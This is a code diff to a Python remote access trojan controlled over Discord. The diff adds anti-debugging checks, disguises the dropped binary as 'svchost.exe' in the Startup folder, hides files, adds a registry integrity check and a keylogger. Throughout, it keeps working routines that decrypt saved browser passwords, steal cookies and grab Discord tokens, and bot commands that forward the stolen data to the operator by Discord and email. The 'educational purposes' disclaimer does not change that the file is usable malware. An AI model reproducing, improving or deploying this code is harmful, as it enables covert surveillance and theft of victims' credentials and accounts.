@@ -1,4 +1,4 @@
-# mytemplate.py - ULTIMATE RAT with WORKING Password Stealer
+# mytemplate.py - FULLY PROTECTED RAT
 # ⚠️ DISCLAIMER: For educational purposes only!
 # Made by Neek :3
 
@@ -31,17 +31,31 @@ import shutil
 import json
 import webbrowser
 import sqlite3
-import smtplib
-import imaplib
-import email
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-from email.header import decode_header
+import hashlib
+from cryptography.fernet import Fernet
 
 if platform.system() != "Windows":
     sys.exit(0)
+
+# ========== ANTI-DEBUGGING ==========
+def check_debugger():
+    """Exit if debugger is attached"""
+    try:
+        if ctypes.windll.kernel32.IsDebuggerPresent():
+            sys.exit(0)
+        # Check for common debugger processes
+        debuggers = ['ollydbg', 'x64dbg', 'windbg', 'ida', 'procexp', 'procmon']
+        for proc in psutil.process_iter(['name']):
+            try:
+                if any(d in proc.info['name'].lower() for d in debuggers):
+                    sys.exit(0)
+            except:
+                pass
+    except:
+        pass
+
+# Run anti-debugging immediately
+check_debugger()
 
 # ========== PROCESS HIDING ==========
 def hide_process_completely():
@@ -78,7 +92,7 @@ def move_to_system_folder():
             ]
             for folder in system_folders:
                 if os.path.exists(folder):
-                    new_path = os.path.join(folder, 'KasierACc.exe')
+                    new_path = os.path.join(folder, 'svchost.exe')
                     if not os.path.exists(new_path) and current_path != new_path:
                         try:
                             shutil.move(current_path, new_path)
@@ -137,18 +151,99 @@ def keep_lock_alive():
         time.sleep(0.1)
 threading.Thread(target=keep_lock_alive, daemon=True).start()
 
+# ========== ENCRYPTED TOKEN STORAGE ==========
+def get_encrypted_token():
+    """Decrypt token from environment or file"""
+    try:
+        # First try environment variable
+        token = os.environ.get('DISCORD_TOKEN')
+        if token:
+            return token
+        
+        # Then try encrypted file
+        token_file = os.path.join(os.path.dirname(sys.executable), 'token.enc')
+        key_file = os.path.join(os.path.dirname(sys.executable), 'key.key')
+        
+        if os.path.exists(token_file) and os.path.exists(key_file):
+            with open(key_file, 'rb') as f:
+                key = f.read()
+            with open(token_file, 'rb') as f:
+                encrypted = f.read()
+            cipher = Fernet(key)
+            return cipher.decrypt(encrypted).decode()
+        
+        # Fallback to placeholder (builder will replace)
+        return "{placeholder_token}"
+    except:
+        return "{placeholder_token}"
+
+def save_encrypted_token(token):
+    """Save token encrypted to file"""
+    try:
+        key = Fernet.generate_key()
+        cipher = Fernet(key)
+        encrypted = cipher.encrypt(token.encode())
+        
+        # Save key and encrypted token
+        key_file = os.path.join(os.path.dirname(sys.executable), 'key.key')
+        token_file = os.path.join(os.path.dirname(sys.executable), 'token.enc')
+        
+        with open(key_file, 'wb') as f:
+            f.write(key)
+        with open(token_file, 'wb') as f:
+            f.write(encrypted)
+        
+        # Hide the files
+        os.system(f'attrib +h "{key_file}"')
+        os.system(f'attrib +h "{token_file}"')
+        
+        return True
+    except:
+        return False
+
+# ========== INTEGRITY CHECK ==========
+def check_integrity():
+    """Check if the file has been modified"""
+    try:
+        # Get the hash of the current file
+        with open(sys.executable, 'rb') as f:
+            content = f.read()
+            current_hash = hashlib.sha256(content).hexdigest()
+        
+        # Store hash in registry
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_READ)
+            stored_hash = winreg.QueryValueEx(key, "SystemHash")[0]
+            winreg.CloseKey(key)
+            if stored_hash != current_hash:
+                sys.exit(0)
+        except:
+            # Store hash if not exists
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion", 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "SystemHash", 0, winreg.REG_SZ, current_hash)
+                winreg.CloseKey(key)
+            except:
+                pass
+    except:
+        pass
+
+# Run integrity check
+check_integrity()
+
 # ========== CONFIGURATION ==========
 class Config:
-    TOKEN = "{placeholder_token}"           
+    # Token is now encrypted/obfuscated
+    TOKEN = get_encrypted_token()
     WHITELISTED = [{placeholder_whitelist}] 
     MAIN_CHANNEL = {placeholder_main_channel} 
     PREFIX = "{placeholder_prefix}"         
     STARTUP = {placeholder_add_to_startup}
     
     # ========== EMAIL CONFIG - REPLACE WITH YOUR INFO ==========
-    EMAIL_SENDER = "your_email@gmail.com"      # Your Gmail
-    EMAIL_PASSWORD = "your_app_password"       # Gmail App Password
-    EMAIL_RECEIVER = "your_email@gmail.com"    # Where to send stolen data
+    EMAIL_SENDER = "your_email@gmail.com"
+    EMAIL_PASSWORD = "your_app_password"
+    EMAIL_RECEIVER = "your_email@gmail.com"
     EMAIL_IMAP = "imap.gmail.com"
 
 # ========== BOT SETUP ==========
@@ -197,8 +292,8 @@ def add_to_startup():
             pass
         try:
             startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-            if not os.path.exists(os.path.join(startup_folder, 'KasierACc.exe')):
-                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'KasierACc.exe'))
+            if not os.path.exists(os.path.join(startup_folder, 'svchost.exe')):
+                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'svchost.exe'))
         except:
             pass
         return True
@@ -433,14 +528,11 @@ def get_default_browser():
 
 # ========== BROWSER DETECTION ==========
 def get_installed_browsers():
-    """Detect all installed browsers on the system"""
     browsers = []
     
-    # Common browser paths
     browser_paths = [
         ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default')),
         ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Profile *')),
-        ('Chrome', os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Guest Profile')),
         ('Edge', os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default')),
         ('Edge', os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Profile *')),
         ('Brave', os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default')),
@@ -455,9 +547,7 @@ def get_installed_browsers():
     ]
     
     for name, path_pattern in browser_paths:
-        # Check if path exists
         if '*' in path_pattern:
-            # Handle wildcard
             import glob
             matches = glob.glob(path_pattern)
             if matches:
@@ -465,18 +555,14 @@ def get_installed_browsers():
         elif os.path.exists(path_pattern):
             browsers.append(name)
     
-    # Remove duplicates
     browsers = list(set(browsers))
     return browsers
 
-# ========== PASSWORD STEALER (FIXED) ==========
-
+# ========== PASSWORD STEALER ==========
 def get_chrome_key(browser_path):
-    """Get browser encryption key"""
     try:
         local_state_path = os.path.join(os.path.dirname(os.path.dirname(browser_path)), 'Local State')
         if not os.path.exists(local_state_path):
-            # Try alternative path
             if 'Edge' in browser_path or 'Brave' in browser_path or 'Vivaldi' in browser_path:
                 local_state_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(browser_path))), 'Local State')
         
@@ -490,21 +576,17 @@ def get_chrome_key(browser_path):
             return None
             
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
-        
-        # Decrypt using Windows DPAPI
+        encrypted_key = encrypted_key[5:]
         key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         return key
     except:
         return None
 
 def decrypt_password(encrypted_password, key):
-    """Decrypt password using AES-GCM"""
     try:
         if not encrypted_password or not key:
             return None
             
-        # Handle different formats
         if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
             encrypted_password = encrypted_password[3:]
             nonce = encrypted_password[3:15]
@@ -517,22 +599,17 @@ def decrypt_password(encrypted_password, key):
             return decrypted.decode('utf-8')
     except:
         try:
-            # Fallback to DPAPI
             return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
         except:
             return None
     return None
 
 def get_browser_passwords_chromium(browser_name, browser_path):
-    """Get passwords from Chromium-based browsers (Chrome, Edge, Brave, Opera, Vivaldi)"""
     passwords = []
     try:
-        # Determine the login data path
         login_data_path = os.path.join(browser_path, 'Login Data')
         
-        # For some browsers, the path might be different
         if not os.path.exists(login_data_path):
-            # Try alternative paths
             possible_paths = [
                 os.path.join(browser_path, 'Login Data'),
                 os.path.join(browser_path, 'Login Data for Account'),
@@ -545,24 +622,19 @@ def get_browser_passwords_chromium(browser_name, browser_path):
         if not os.path.exists(login_data_path):
             return passwords
         
-        # Get the encryption key
         key = get_chrome_key(login_data_path)
         if not key:
             return passwords
         
-        # Copy database to temp
         temp_path = os.path.join(os.environ['TEMP'], f'{browser_name}_login.db')
         shutil.copy2(login_data_path, temp_path)
         
-        # Connect to database
         conn = sqlite3.connect(temp_path)
         cursor = conn.cursor()
         
-        # Query logins
         try:
             cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
         except:
-            # Some browsers might have different table structure
             cursor.execute('SELECT url, username, password FROM logins')
         
         rows = cursor.fetchall()
@@ -589,13 +661,12 @@ def get_browser_passwords_chromium(browser_name, browser_path):
         conn.close()
         os.remove(temp_path)
         
-    except Exception as e:
+    except:
         pass
     
     return passwords
 
 def get_firefox_passwords(profile_path):
-    """Get passwords from Firefox"""
     passwords = []
     try:
         logins_path = os.path.join(profile_path, 'logins.json')
@@ -622,10 +693,8 @@ def get_firefox_passwords(profile_path):
     return passwords
 
 def get_all_passwords():
-    """Get passwords from all browsers"""
     all_passwords = []
     
-    # Chromium-based browsers
     chromium_browsers = {
         'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
         'Chrome_Profile': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
@@ -641,17 +710,14 @@ def get_all_passwords():
         'Arc': os.path.expandvars(r'%LOCALAPPDATA%\Arc\User Data\Default'),
     }
     
-    # Check each Chromium browser
     for browser_name, browser_path in chromium_browsers.items():
         if os.path.exists(browser_path):
             try:
-                # Try Default profile first
                 passwords = get_browser_passwords_chromium(browser_name, browser_path)
                 all_passwords.extend(passwords)
             except:
                 pass
     
-    # Firefox
     firefox_profiles = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
     if os.path.exists(firefox_profiles):
         for profile in os.listdir(firefox_profiles):
@@ -663,7 +729,6 @@ def get_all_passwords():
                 except:
                     pass
     
-    # Also check Firefox in AppData\Local
     firefox_local = os.path.expandvars(r'%LOCALAPPDATA%\Mozilla\Firefox\Profiles')
     if os.path.exists(firefox_local):
         for profile in os.listdir(firefox_local):
@@ -678,7 +743,6 @@ def get_all_passwords():
     return all_passwords
 
 def get_browser_cookies_chromium(browser_name, browser_path):
-    """Get cookies from Chromium-based browsers"""
     cookies = []
     try:
         cookie_path = os.path.join(browser_path, 'Cookies')
@@ -726,7 +790,6 @@ def get_browser_cookies_chromium(browser_name, browser_path):
     return cookies
 
 def get_all_cookies():
-    """Get cookies from all browsers"""
     all_cookies = []
     
     chromium_browsers = {
@@ -748,13 +811,10 @@ def get_all_cookies():
     
     return all_cookies
 
-# ========== TOKEN STEALER ==========
 def get_discord_tokens():
-    """Get Discord tokens from all possible locations"""
     tokens = []
     token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
     
-    # Discord app paths
     discord_paths = [
         os.path.expandvars(r'%APPDATA%\Discord\Local Storage\leveldb'),
         os.path.expandvars(r'%APPDATA%\DiscordCanary\Local Storage\leveldb'),
@@ -762,7 +822,6 @@ def get_discord_tokens():
         os.path.expandvars(r'%APPDATA%\Lightcord\Local Storage\leveldb'),
     ]
     
-    # Check Discord app storage
     for path in discord_paths:
         if os.path.exists(path):
             try:
@@ -781,7 +840,6 @@ def get_discord_tokens():
             except:
                 pass
     
-    # Check browsers for Discord tokens
     chromium_browsers = {
         'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
         'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb'),
@@ -810,7 +868,6 @@ def get_discord_tokens():
     
     return tokens
 
-# ========== HELPER FUNCTIONS ==========
 def get_installed_apps():
     apps = []
     try:
@@ -1133,6 +1190,10 @@ async def on_ready():
         if Config.STARTUP:
             add_to_startup()
         
+        # Encrypt and save token if not already done
+        if Config.TOKEN and Config.TOKEN != "{placeholder_token}":
+            save_encrypted_token(Config.TOKEN)
+        
         # Start email forwarding
         email_monitor_running = True
         threading.Thread(target=start_email_monitor, daemon=True).start()
@@ -1151,7 +1212,8 @@ async def on_ready():
                 f"User: **`{user}`**\n"
                 f"Startup: {startup_status}\n"
                 f"Type `{Config.PREFIX}help`\n"
-                f"📧 Email Forwarding: Running"
+                f"📧 Email Forwarding: Running\n"
+                f"🔒 Token: Encrypted & Protected"
             ),
             color=discord.Color.green()
         )
@@ -1281,6 +1343,11 @@ async def cmd_help(ctx):
             "`addstartup` - Add to startup",
             "`clearchat [amount]` - Delete bot messages",
             "`exit` - Close RAT",
+        ],
+        "🛡️ Security": [
+            "`🔒 Token encrypted and protected",
+            "`🔒 Anti-debugging enabled",
+            "`🔒 Integrity checks active",
         ],
         "🎀 Credits": [
             "-# Thanks to **Neek**, this product is brought to you for free! 🎀"
@@ -1452,14 +1519,12 @@ async def cmd_startupapps(ctx):
 @bot.command(name='passwords')
 @is_authorized()
 async def cmd_passwords(ctx):
-    """Grab saved passwords from ALL browsers"""
     try:
         await send_embed(ctx, "🔑 Password Stealer", "Searching ALL browsers for saved passwords...", discord.Color.gold())
         
         all_passwords = get_all_passwords()
         
         if all_passwords:
-            # Group by browser
             output = "=== SAVED PASSWORDS ===\n\n"
             current_browser = ""
             for p in all_passwords:
@@ -1475,7 +1540,6 @@ async def cmd_passwords(ctx):
             with open(filename, 'w', encoding='utf-8') as f:
                 f.write(output)
             
-            # Send to email
             send_stolen_data("PASSWORDS", output)
             
             await ctx.send(file=discord.File(filename))
@@ -1496,7 +1560,6 @@ async def cmd_passwords(ctx):
 @bot.command(name='tokens')
 @is_authorized()
 async def cmd_tokens(ctx):
-    """Grab Discord tokens from ALL locations"""
     try:
         await send_embed(ctx, "🔑 Token Grabber", "Searching for Discord tokens...", discord.Color.gold())
         
@@ -1507,7 +1570,6 @@ async def cmd_tokens(ctx):
             for token in tokens:
                 output += token + "\n"
             
-            # Send to email
             send_stolen_data("DISCORD_TOKENS", output)
             
             embed = discord.Embed(
@@ -1525,7 +1587,6 @@ async def cmd_tokens(ctx):
 @bot.command(name='cookies')
 @is_authorized()
 async def cmd_cookies(ctx):
-    """Grab cookies from ALL browsers"""
     try:
         await send_embed(ctx, "🍪 Cookie Stealer", "Searching ALL browsers for cookies...", discord.Color.blue())
         
@@ -2446,6 +2507,72 @@ async def cmd_exit(ctx):
         sys.exit(0)
     except Exception as e:
         await send_embed(ctx, "Command Error", str(e), discord.Color.red())
+
+# ========== KEYLOGGER FUNCTIONS ==========
+def start_keylogger():
+    global KEYLOGGING, KEYLOG_DATA
+    KEYLOGGING = True
+    KEYLOG_DATA = []
+    
+    def keylogger_thread():
+        try:
+            from pynput import keyboard
+            
+            def on_press(key):
+                global KEYLOG_DATA
+                if KEYLOGGING:
+                    try:
+                        if hasattr(key, 'char') and key.char:
+                            KEYLOG_DATA.append(key.char)
+                        else:
+                            if key == keyboard.Key.space:
+                                KEYLOG_DATA.append(' ')
+                            elif key == keyboard.Key.enter:
+                                KEYLOG_DATA.append('\n')
+                            elif key == keyboard.Key.backspace:
+                                if KEYLOG_DATA:
+                                    KEYLOG_DATA.pop()
+                            elif key == keyboard.Key.tab:
+                                KEYLOG_DATA.append('\t')
+                            elif key == keyboard.Key.shift:
+                                KEYLOG_DATA.append('[SHIFT]')
+                            elif key == keyboard.Key.ctrl:
+                                KEYLOG_DATA.append('[CTRL]')
+                            elif key == keyboard.Key.alt:
+                                KEYLOG_DATA.append('[ALT]')
+                            elif key == keyboard.Key.esc:
+                                KEYLOG_DATA.append('[ESC]')
+                            elif key == keyboard.Key.up:
+                                KEYLOG_DATA.append('[UP]')
+                            elif key == keyboard.Key.down:
+                                KEYLOG_DATA.append('[DOWN]')
+                            elif key == keyboard.Key.left:
+                                KEYLOG_DATA.append('[LEFT]')
+                            elif key == keyboard.Key.right:
+                                KEYLOG_DATA.append('[RIGHT]')
+                            elif key == keyboard.Key.cmd:
+                                KEYLOG_DATA.append('[WIN]')
+                    except:
+                        pass
+            
+            def on_release(key):
+                return True
+            
+            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+                listener.join()
+        except:
+            pass
+    
+    thread = threading.Thread(target=keylogger_thread, daemon=True)
+    thread.start()
+    return True
+
+def stop_keylogger():
+    global KEYLOGGING, KEYLOG_DATA
+    KEYLOGGING = False
+    data = ''.join(KEYLOG_DATA)
+    KEYLOG_DATA = []
+    return data
 
 # ========== RUN ==========
 if __name__ == "__main__":
